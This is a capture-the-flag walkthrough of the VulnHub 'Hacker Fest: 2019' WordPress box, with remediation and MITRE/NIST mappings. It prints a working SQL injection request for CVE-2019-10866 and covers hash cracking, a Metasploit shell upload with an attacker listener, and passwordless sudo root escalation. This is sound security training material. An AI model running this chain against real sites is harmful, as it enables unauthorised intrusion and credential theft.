# Hacker Fest: 2019 — The Party Started With SQL, Ended With Root

Hacker Fest: 2019 is a beginner-friendly WordPress box that packs a real-world punch. A vulnerable Google Maps plugin with an unauthenticated SQL injection endpoint hands you the admin hash without ever logging in. Crack it with rockyou, upload a PHP shell via Metasploit, and then enjoy the fact that the webmaster can literally run `sudo su` with zero password prompt. A box that is over before the balloons hit the floor. Legit fun, dude.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Hacker Fest: 2019 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/hacker-fest-2019,405/ |
| **Techniques** | Nmap recon, WPScan WordPress enumeration, SQLi via Google Maps plugin REST API, John the Ripper hash cracking, Metasploit wp_admin_shell_upload, sudo su privesc |
| **CVEs** | CVE-2019-10866 (WP Google Maps plugin SQLi), CWE-269 (Improper Privilege Management via sudo) |
| **APT Groups** | APT41: exploits vulnerable WordPress plugins for initial access in supply-chain and media sector attacks; Magecart groups: consistently target WordPress e-commerce plugins via SQL injection for credential harvesting |

---

## Attack Summary

```
netdiscover + nmap → HTTP (80), FTP (21), SSH (22)
  |
  +--> WPScan → WordPress + Google Maps plugin v7.11.x (vulnerable)
          |
          +--> CVE-2019-10866 SQLi → webmaster hash (MD5)
                  |
                  +--> John rockyou → plaintext password
                          |
                          +--> wp_admin_shell_upload (Metasploit) → Meterpreter (www-data)
                                  |
                                  +--> sudo -l → sudo su NOPASSWD → root
```

---

## Methodology

1. Host discovery and service enumeration
2. WordPress fingerprinting with WPScan
3. Identify vulnerable Google Maps plugin version
4. Exploit SQLi endpoint to extract admin hash
5. Crack hash with John the Ripper and rockyou
6. Authenticate to WordPress admin panel
7. Upload PHP reverse shell via Metasploit authenticated module
8. Escalate via unrestricted sudo misconfiguration

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.0.0/24
# Target: 192.168.0.20

nmap -sV -sC -A 192.168.0.20
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.x
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x (WordPress)
```

HTTP on port 80 with WordPress signals the primary attack path. FTP and SSH are noted for later.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — WordPress Enumeration with WPScan

```bash
wpscan --url http://192.168.0.20/ --enumerate u,p,t
```

WPScan fingerprints:
- WordPress version
- Plugins installed: **WP Google Maps** version 7.11.x (vulnerable range: 7.11.00-7.11.17)
- Users: `webmaster`

The Google Maps plugin in this version range has an unauthenticated SQL injection vulnerability in the WordPress REST API endpoint.

**Alternatively:** Manual check at `http://192.168.0.20/wp-json/wpgmza/v1/features/base64eNp...`

**MITRE ATT&CK:** T1595.002 — Active Scanning: Vulnerability Scanning

---

## Step 3 — SQL Injection via Google Maps Plugin (CVE-2019-10866)

The vulnerability exists in the WP Google Maps REST API route. Send a crafted request to extract the WordPress users table:

```bash
# Manual SQLi
curl "http://192.168.0.20/?rest_route=/wpgmza/v1/markers&filter=%7B%22where%22%3A%22id%3D1+UNION+SELECT+1%2C2%2C3%2C4%2Cuser_pass%2Cuser_login%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26+FROM+wp_users--+-%22%7D"
```

The response includes the admin/webmaster hash in MD5 format:

```
webmaster:$P$B[hash]...
```

Save it:

```bash
echo 'webmaster:$P$B...' > /tmp/wp_hash.txt
```

**Real-world note:** CVE-2019-10866 affected versions 7.11.00 through 7.11.17 of WP Google Maps, one of the most popular WordPress plugins with over 400,000 active installs. This kind of unauthenticated REST API SQLi is exactly what Magecart groups use to extract credentials before deploying payment skimmers.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1552.001 — Credentials in Files

---

## Step 4 — Crack the Hash

WordPress stores passwords as MD5-based phpass hashes (`$P$`). John the Ripper handles this natively:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/wp_hash.txt
john --show /tmp/wp_hash.txt
```

```
webmaster:[password]
```

**Alternatively:** `hashcat -m 400 /tmp/wp_hash.txt /usr/share/wordlists/rockyou.txt -w 3`

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking

---

## Step 5 — Upload Shell via Metasploit

With valid WordPress admin credentials, use Metasploit's authenticated shell upload module:

```bash
msfconsole -q
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS 192.168.0.20
set USERNAME webmaster
set PASSWORD [cracked_password]
set LHOST [attacker_ip]
run
```

Metasploit authenticates to WordPress, creates a malicious plugin, uploads it, and activates it, delivering a Meterpreter session as `www-data`.

```
meterpreter> getuid
Server username: www-data
```

**MITRE ATT&CK:** T1505.003 — Server Software Component: Web Shell

---

## Step 6 — Privilege Escalation via sudo su

```bash
meterpreter> shell
python -c 'import pty; pty.spawn("/bin/bash")'

sudo -l
# User www-data may run the following commands:
# (ALL : ALL) NOPASSWD: /bin/su

sudo su
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

gg no re. Root in seconds after the shell landed.

**Real-world note:** `sudo su` with NOPASSWD is equivalent to giving any process running as www-data a passwordless root shell. On a WordPress server, this means any malicious plugin or file upload has an instant path to full system compromise. This misconfiguration is a critical finding in any Linux penetration test.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Method |
|---|---|---|---|
| WordPress hash | $P$B[hash] | wp_users table | CVE-2019-10866 SQLi |
| Credentials | webmaster:[password] | Cracked from hash | John rockyou |
| Root shell | uid=0 | /bin/su via sudo | NOPASSWD sudo su |
| Root flag | {flag} | /root/flag.txt | sudo su → cat |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Unauthenticated SQLi in WordPress plugin (CVE-2019-10866) | 400k+ installs affected; credential theft without authentication | Keep WordPress plugins updated; use a WAF with WordPress rules |
| 2 | Admin hash cracked from rockyou | Weak passwords for CMS admins are consistently crackable | Enforce strong password policy; use password manager for all admin accounts |
| 3 | Metasploit plugin upload works with valid admin creds | Any WordPress admin can achieve RCE via malicious plugin | Restrict plugin installation to site owners; implement file integrity monitoring |
| 4 | `sudo su` NOPASSWD for www-data | Any web compromise immediately escalates to root | Never grant sudo to web service accounts; restrict sudo to specific, safe commands |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Active Scanning | Vulnerability Scanning | T1595.002 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Execution | Persistence | Server Software Component: Web Shell | T1505.003 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Discovery | Discovery | Network Service Discovery | T1046 |

---

## Remediation and Containment

### Technical Fixes

1. **Update WP Google Maps**: upgrade past 7.11.17; apply the CVE-2019-10866 patch
2. **Enforce strong WordPress admin passwords**: minimum 16 characters; block common passwords
3. **Restrict plugin installation**: only site owner can install plugins; implement file integrity monitoring on `/wp-content/plugins/`
4. **Remove sudo from www-data**: web service accounts must never have sudo rights
5. **Deploy a WAF**: ModSecurity or Cloudflare with WordPress ruleset to detect REST API SQL injection patterns

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (patch vulnerable plugin; WAF rules)
- **D3-OAM** — Operating System Administrative Management (remove sudo from www-data)
- **D3-PA** — Platform Monitoring (file integrity monitoring on wp-content)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all WordPress installations and plugins; track CVEs per plugin |
| Protect | Access Control | Remove sudo from web service accounts; enforce strong admin passwords |
| Protect | Protective Technology | Deploy WAF with WordPress rules; monitor plugin installations |
| Detect | Anomalies | Alert on REST API SQLi patterns; unexpected plugin activations |
| Respond | Response Planning | Deactivate vulnerable plugin; rotate WordPress admin credentials |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| CM-6 | Configuration Settings | No sudo for web service accounts; updated plugins only |
| IA-5(1) | Password-Based Authentication | Strong WordPress admin passwords |
| SI-2 | Flaw Remediation | Patch WP Google Maps; patch management workflow |
| SC-28 | Protection of Information at Rest | Credentials not stored in plaintext |
| AC-6 | Least Privilege | Minimum required permissions for WordPress processes |

### CISA KEV

CVE-2019-10866 (WP Google Maps SQLi) is a documented exploitation pattern. CISA advises organizations to maintain a patched plugin inventory and implement web application firewalls per AA21-116A.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage Asset Configuration | MIL2 |

---

## Final Thoughts

Hacker Fest: 2019 is a clean, well-scoped beginner box that teaches a complete real-world attack chain: plugin CVE → hash cracking → authenticated RCE → sudo privesc. Every technique here maps directly to how actual threat actors compromise WordPress sites.

The CVE-2019-10866 lesson is especially valuable: a plugin with 400k active installs, zero authentication required, credentials handed over via a REST API. That is not a contrived CTF scenario; that is a Tuesday for a web pentest team.

Solid box for anyone learning the WordPress attack surface. No cap.

Thanks guys!! (❍ᴥ❍ʋ)
